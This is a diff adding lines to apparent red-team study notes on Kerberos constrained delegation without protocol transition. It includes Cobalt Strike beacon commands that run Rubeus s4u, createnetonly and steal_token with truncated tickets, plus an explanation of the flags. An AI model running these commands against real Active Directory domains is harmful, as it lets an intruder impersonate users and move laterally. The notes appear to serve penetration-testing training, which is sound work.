@@ -74,3 +74,12 @@ three types: unconstrained, constrained, role-based
                     beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=
                     beacon> steal_token 3380
             without protocol transition:
+                we must obtain a service ticket that a user has already requested, hence we are limited to impersonating those whom service tickets are available
+                once we have a ticket:
+                    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
+                        where...
+                            /user is the computer configured for delegation
+                            /msdsspn is the service the principal is allowed to delegate to
+                            /ticket is the TGT for the principal
+                            /tgs is a captured service ticket for a user
+                now we can interact with the service, as above
